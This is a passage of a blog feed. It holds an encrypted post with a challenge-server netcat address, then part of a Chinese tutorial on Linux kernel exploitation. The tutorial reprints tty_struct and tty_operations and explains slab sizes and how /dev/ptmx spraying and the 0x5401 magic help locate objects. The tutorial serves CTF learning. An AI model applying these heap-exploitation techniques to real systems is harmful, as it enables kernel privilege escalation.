13bc68bb90e6c13b5f7b3e3f9d68f011524c8e28c0f0a33abfa182231ca94e0b9ba10946d470c124de245e69763abea3ff171b37591bfa3b3df4f1592eab6eeca37dd4f9fcde369f7ed5913d0b11f09d3b3f74bbf1ef1284c678effba83ca236daaa29cb539122fac4d8d8e7744488aa41fa0919fd03df5e28a909489bded35dea78b1e5b104ea79a29fb3f57fded7aeba6533738c1825725d0339c8f979d9f72bf69e7cc01654730579a3e3615aeec9df8a4bca463a1c10fd6f0eecfc494214ae028c8395c3f5c5c485c9326776680a61a1fffd595c70c181621de2e158c257ea145d06b331df5fbfc8950c43d0decf847951160d1dfea17f7200261564f040642b6b25bbf7f665e69626decd90a9382bf44bf16202dd4c5f049d9937f080220a6affee0e532f93ce4f99c7ac5539dd0a2981aef1a03e14f37895da63122eb139c9b735b7b8e154b1fbb64e428cc7b0849853387ca553ddb10dcb485c2db2754bf934cb871aa31237b8f28cb3e4ecb6a5c354c098a1cab388bc5a83ccb96e93d211b8b660f21ff3ace58c0ab1f179ea02c1de817dcb9a7f2807cd347cb1016f7039014549d4565995dfe61702087106a2c432538cc9ed10a08bd0b4ad99401b1b8a399930353ab6bd332d301ec2be00c1d88e1070034edfeba085dd955d89495b7588cd3cd02eb0be3301f60aa807b56c06d0babac577258b68b3fa0e08010eb4df52973fdd640251978352b89a1ee9046a374a939608dbd0a04105627315fa32e0c5666aceffe420253c65ad6cecd14db88a2e2d6ce6b2e0baaa0f639916fd9813e03b2e06cc6098c9c87deb49d6314a1cdbcb891f4fbe7c95b0a41793a94f6eedaeafae7d4a818d53adad3e6ba4905bb93448ded5375fabc86cb75063f1f6d6b519a09ec2b0b01511963f663a8a71d97ece304847acbe1cea53a8de6ad668fc7515b978009f3fdcd444df0ca6cb43d715b199e1be063c7e96e4b2db2150c3fb0ce2235c9ddfdecb9ee9b399a8bfd5ef8d2b88716621e5f75bed046b75829a05535bc16a3f51a936a235e711ee9c3268cea90754058e756719761a379c14bbac42428ab2346c319b515bcecb106aa36e6ac559920d9e049cc5462397904fb55360a4f3e02a4387c518c55fe82158d1d647b84dc08f3857027a689bb6cad11783cb7155d2a3c4c7f8798b6076e7909e926a11f229ee9d3c117fdfb92118ee6ec46d13e8d28560b57a98533fec4335f7cdc7f5a19150014e93c0222fc7f98cd74a60864f50829885b1f56cf8ec9ba6ab01f21b584612d90a59ae0b048fc5f98aab4c365adf6b20c9c4b4df1aa8cee9a185a63c12fa5a1080895f5a01d81b1618bb22491321b2c94d1131e7ff1c472ad655f68f34b03b2ee6932f5f6bd43ce55d03e8494254bba954a7ca3d7c61908e33558cb51b52d2edf70568357b83ee961097be860040bd783374c8bfb334315998370caf3024b2fd42299a38228b45280e70755a75c0e61fb2a885623d96b018b3b8f7ff393811147c0e24444330219bf7df804bbeeef36059a153705c7ec425fa6bed98c975b656314a817dcd3517e6baede4b68d0ba9890a286cd47d8e37fe1fbf3e8492fd7d0e265b136d7a9decd92d5fd2499e3ef3d87ba89fa02ec1dc22b399109bcd8c9330d914c1aced52d370413f9eb7a52f01a9b94ce79ce2640eaa2529c225c06c01ea3b93f7aa268a58050a14620e2a0e525f532fe23361d6dd11d95a81cb8c4e479f5a66298eeb0ddf82465083714082e859a7282290f944aa60aad992a341acd08dcc0a7b10f5578c708cf9fde888ce10b16efb8ce69a032c2a24e191931c1e62ce44fc058f0351711184742975e997922589c0e344430c51777dd00696f2022baab76de8c7497eefa381a59310c127700e96184d0377b669fb42c454c4a1549482b5105224e4feab81e0b20fed6922eee3c31fe594483eb2d7f92c879116ab28328455035010383109573b69bf909ffc684d1036a5e7255ccc6801ae58f4a781f32c75eee411dbe0e893c9138c9bc0505470eb4854c74f9790f59f05c254b77ff79dc23ce6ad9cbb56f281c82e9bd2686de9d6723a333cce5c28fe3605af72bfc1b9c32ee01ab89472b8915371b5125499519caa4b11ba82364331bebdba39c1e58f7f81ccb58b16f09fe31fc9dfbad190a9139f43a80c45e04021a00c60a2a9fd468c925fcc9c0518b99528aab8931ab892d920e0d3257107a79dcae3852eaaa00848b06d36cf509b59bf2e0a1f705aeb89c39a172d2faf4573aa6b004d7d0ed4005a9b52eeb2b65ca681bdb544a9911805affa63efe36cd132a4b2bdd58e68c48a095cb72777854cc66c862958bdf7cb75b567cfe9a4aac16e20e5d0481b22036fe43e60b7b597dae145f2cd5437a56f40fe7a8c9d5026952e95ad35813db4e0c249fa2740ff9b7559e5a2a574d06a4f33f6123d9b8f9a4645f105fe2bc20593cee3064cd49e311cda603400b4ee40e4cfc98ca1727816d76a57329d09f958ff012159079d2350e5c7714869275bf406fc494715e5a0c906703fcc2fdbac714a087e3b4ccc4e32fe44fd7295e4a0800419d0298c7c8b0bf49679489b019877b3b0a5ccc04ef3c95e715a11bcefb6d1f49cc23f44ecdf7effab2882567ca7af4f921117fe9612517f0c5b5942dbf93e659861a01d6116608478424c113f1e971118a464af3cf0cc6819e91ba8d3efd6a8daaeab4718f51fa1e686d2e55f32a71d85a7c9e6a0416e88c4fd1d94e60a6346b306cd0e2c71e24c99a2ede14bf47caa22c67dd9b2e1baa66b720b8e7e9862853ad020ff309a03534a1de892a524257f8e2b15ce903cfb76c868ef022d829d31b33f853758ebac2fca7b36ed1feb77d59cd2e0cfbf73109112029d4afcad757bb1061f7712087e08c0bfa9c53a0039c4b395dda6140ed6ab993a1f81e1266b5d2c04e8dfdb7f1815955c76f3a4e4d94ba6cc9f13f4e654a78f34eb85f8160aa7b392969e72718cf13b99df99e09059d2117c5f596c6e3d4dda8ba347fef0a7aecb8d9eb0b821ccdd29838592f24e5a143d630c52c0d9137f7f00df229f443229ee811f18c5050983092d46081bef50353ca3f2435f9ccb6a22accd4da3d8ed5d2acc1c012e7f331e9fcddf7b8bbb4374729476c4a00a8a72105f0a205193ad4add39987d8008970d3fd45b5d0f10232892e2322bc4d412292124c1b6fd0537d0b37e0d18c113a4489c51541522724c246ed81a59966ef8670de205cd027e5a74cb51be698a41fa5bdfa3d78fefa0b0167e3b74808a2e4186faa16160c9656d0ff0c99c31dedfc91cd014086650a15de47fa8d303429f5d8447320ac08e7e5d9e677388fe618425eb697af587199d9b96223def1f4a99b77bffba83af5896a87221355b5fde1ecafdd5cf3a3c42c70bf96a53ce59c0a7d00099d8a2d8294a10dda6b4de4c0cd377461abe2185497d7076b4e94543ebefdc86b657237cd61eda2d802550f443feb44f90b87f47fafd789e1aa0432ceedad34aaf525b4ae5db096c897cd4da4641756263ea2daf4e7a455a4a081816b761e0c8a4044970e5d79fe4c69267645657f13219853780c34d5b7d51254ce55a0a6dc9c8fecd03935255478b08750d787e9dc20cf39de832d9dda8ae675077a53b92da5fa5106b26c1fdaeecc9b0eb9aec18da1b20ff7d0c5a2a8812a66e7b0aa18bb04c815d86cdb75a222aa2a5244c65d9e981a8945fd5a8f7bdd4b6c5046ec9216e6ba438a7fbb8f37aa9f34e68a16e52cd2d70d27f1c028483af1082198639922a3dd28442e8e85d2aeb2310be2e855ed60d6910ce32766a956f2edf0f426644d69ea7412f12e8f1d03bc671c776af163e9a3e16700028eb74887cbbf1fe8a3fba8f8751ed6f6744b3ce9ae17e46e07e2f458c0c64dd6f19dd728ee14206089f6374e1cc879b77ec0d81aee3ec45561e9b609dbbe3b79762e6488ecae911e3cac558407846f3cc4484cf70a9d7cd79e386371ecd338f5df3c45a7ae9d4ee0517a8eb141004f962fdcc61f60619ac905c3afd85bebbac6814bd9ae629fa330e6ff3146ac5f44b25b6f768e188bc9f948a314cd92359ef894893eb6ab6db5d322486e7484c42f5909222d330f2a97ce03e1d0961c5f2bd8de3e47cfb0859433432f2fc2cd3a905b26b3bc26cfb49f4758aea03fe9ea15bd8683ac016ddea4d3736d4221c3d3808920ae2e2afae3264b011cb9a3b5ffb774f3a13dcde705b4432ff96615c4da8a786dc0bbfeeffd8cef3ec1f1cb8a74aee5083dfa570d2fe381b7d92511445cb2295164e4220da9879b196e5b6b634dc707a791db535aeac0e8ee3ef217dccadbc42de2081c4b67f4b766eca117b131055be2133839b3f2ae5a7312adfe3c055a091901710326c15ec4fd083f10581af7c51402d04c3f05c8c6aa7a7f1bc4c26211645a66e4c3b60eae55af884c08d59e2bdfb685ae2c9dfe0af0780be6786b50b4fca621f7e118530dbd936a5dcaa81c34589992f5ce8df9891b2feb1fcdeeeead7d8a6eeb370e81f57d71952c53dc0f010005b83b6be9918002bfe2428ef5688a37cb5f4f88689bfe4d3c8f566d769fb762388ce285ba501b3250bc2a9d45206eea3fd18e175559e57b2fd3c4ec312a8352ff337a2a45170d199762b830e819eae714f6cb2d31b3751cc2ce2767bd43e25a8b22ef68b94ef110fb642bb9dd76ee6b9e8fe66fd26e939e708ed4034fd6540bc35a4240f2904d9c085dd68f10a45ea53c4904683fccb196b92e6230c48c6e2565c44c366e1356a2ced4e47fba3897da90a5cfb79f1e9ca4e682</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">当每一次星光洒下，就没有什么值得害怕</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【PWN.0x02】Linux Kernel Pwn II：通用结构体与技巧</title>
    <link href="http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/"/>
    <id>http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</id>
    <published>2021-11-29T05:51:25.000Z</published>
    <updated>2022-08-18T17:47:30.820Z</updated>
    
    <content type="html"><![CDATA[<p>我是小小做题家</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本篇博客中出现的源代码皆选自 Linux v5.15，不过大部分情况下本篇博文中的大部分结构体都不会随着版本更新而发生改动</p><h2 id="pahole：查阅内核结构体的工具"><a href="#pahole：查阅内核结构体的工具" class="headerlink" title="pahole：查阅内核结构体的工具"></a>pahole：查阅内核结构体的工具</h2><p>有的时候在<del>做CTF题</del>进行内核漏洞利用时，我们往往会遇到各种奇葩的通用分配结构体大小，而漏洞环境提供的结构体本身不能够帮助我们比较舒适地完成利用，此时我们需要找一个较为合适的结构体帮助我们完成利用，该怎么办？</p><p>可能大家会想到：自然是利用谷歌搜索一下有没有什么比较好用的结构体啦！或者是寻找一些前人留下的整合的成果，比如说<a href="https://zplin.me/papers/ELOISE.pdf">这篇论文</a>或者是其他大师傅的一些文章，偶尔或许也可能在某个角落翻到笔者的这篇博客（笑）</p><p>但最好的办法自然是<strong>自己动手丰衣足食</strong>，这里笔者向大家介绍一个工具——<code>pahole</code></p><p>用法比较简单，直接执行便能获取<strong>对应内核中所有结构体的信息，包括大小、各成员偏移量等</strong>，虽然有的内核编译时不一定会选择导出这玩意所要用的东西，但各个版本内核之间不会有太大差异，找一个相同版本的内核跑一遍 pahole 即可</p><h2 id="slab-amp-amp-slub-amp-amp-slob-分配-object-的最小大小"><a href="#slab-amp-amp-slub-amp-amp-slob-分配-object-的最小大小" class="headerlink" title="slab &amp;&amp; slub &amp;&amp; slob 分配 object 的最小大小"></a>slab &amp;&amp; slub &amp;&amp; slob 分配 object 的最小大小</h2><p>在 <code>include/linux/slab.h</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The largest kmalloc size supported by the SLAB allocators is</span><br><span class="hljs-comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span><br><span class="hljs-comment"> * less than 32 MB.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * WARNING: Its not easy to increase this value since the allocators have</span><br><span class="hljs-comment"> * to do various tricks to work around compiler limitations in order to</span><br><span class="hljs-comment"> * ensure proper constant folding.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span><br><span class="hljs-meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_SHIFT_LOW    5</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Kmalloc subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> KMALLOC_MIN_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p> 即 <strong>slab 分配器分配的 object 的大小最小为 32，slob 和 slub 的最小 object 大小为 8</strong></p><h1 id="0x01-tty-设备结构体"><a href="#0x01-tty-设备结构体" class="headerlink" title="0x01.tty 设备结构体"></a>0x01.tty 设备结构体</h1><p>tty 设备可以说是 kernel pwn 入门当中 <em>最经典</em> 的利用目标，尤其是 <code>/dev/ptmx</code> ，相信大家已经对其再熟悉不过了，不过这里笔者还是简单介绍一下这个“万能”的 tty 设备及其相关内核结构体</p><h2 id="tty-struct（kmalloc-1k）"><a href="#tty-struct（kmalloc-1k）" class="headerlink" title="tty_struct（kmalloc-1k）"></a>tty_struct（kmalloc-1k）</h2><p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct tty_struct - state associated with a tty while open</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flow.lock: lock for flow members</span><br><span class="hljs-comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span><br><span class="hljs-comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span><br><span class="hljs-comment"> *              precedense over @flow.stopped)</span><br><span class="hljs-comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span><br><span class="hljs-comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span><br><span class="hljs-comment"> *         there for the very same reason.</span><br><span class="hljs-comment"> * @ctrl.lock: lock for ctrl members</span><br><span class="hljs-comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span><br><span class="hljs-comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span><br><span class="hljs-comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span><br><span class="hljs-comment"> *          them.</span><br><span class="hljs-comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span><br><span class="hljs-comment"> * @ctrl.packet: packet mode enabled</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * All of the state associated with a tty while the tty is open. Persistent</span><br><span class="hljs-comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br>    <span class="hljs-type">int</span>    magic;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>    <span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-type">int</span> index;<br><br>    <span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span><br>    <span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br>    <span class="hljs-type">int</span> count;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span>        <span class="hljs-comment">/* winsize_mutex */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">spinlock_t</span> lock;<br>        <span class="hljs-type">bool</span> stopped;<br>        <span class="hljs-type">bool</span> tco_stopped;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>    &#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) flow;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">spinlock_t</span> lock;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pktstatus;<br>        <span class="hljs-type">bool</span> packet;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>    &#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) ctrl;<br><br>    <span class="hljs-type">int</span> hw_stopped;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;    <span class="hljs-comment">/* Bytes free for queue */</span><br>    <span class="hljs-type">int</span> flow_change;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span><br>    <span class="hljs-type">wait_queue_head_t</span> write_wait;<br>    <span class="hljs-type">wait_queue_head_t</span> read_wait;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span><br>    <span class="hljs-type">void</span> *disc_data;<br>    <span class="hljs-type">void</span> *driver_data;<br>    <span class="hljs-type">spinlock_t</span> files_lock;        <span class="hljs-comment">/* protects tty_files list */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096</span><br><br>    <span class="hljs-type">int</span> closing;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;<br>    <span class="hljs-type">int</span> write_cnt;<br>    <span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span><br>&#125; __randomize_layout;<br><br><span class="hljs-comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_file_private</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">tty</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>&#125;;<br><br><span class="hljs-comment">/* tty magic number */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_MAGIC        0x5401</span><br></code></pre></td></tr></table></figure><h3 id="分配-x2F-释放"><a href="#分配-x2F-释放" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>在注释中提示我们：当我们打开 tty 设备时内核中便会创建一个 tty_struct，通常情况下我们选择打开 <code>/dev/ptmx</code> 来在内核中分配一个 tty_struct 结构体，相应地当我们将其关闭时该结构体便会被释放回 slab&#x2F;slub 中</p><h3 id="魔数"><a href="#魔数" class="headerlink" title="魔数"></a>魔数</h3><p>tty_struct 的魔数为 <code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体（例如<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">强网杯2021-noteook</a>)</p><h2 id="tty-operations"><a href="#tty-operations" class="headerlink" title="*tty_operations"></a><em>*tty_operations</em></h2><p>内核中 tty 设备的 ops 函数表，定义于 <code>/include/linux/tty_driver.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*write_room)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*chars_in_buffer)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span 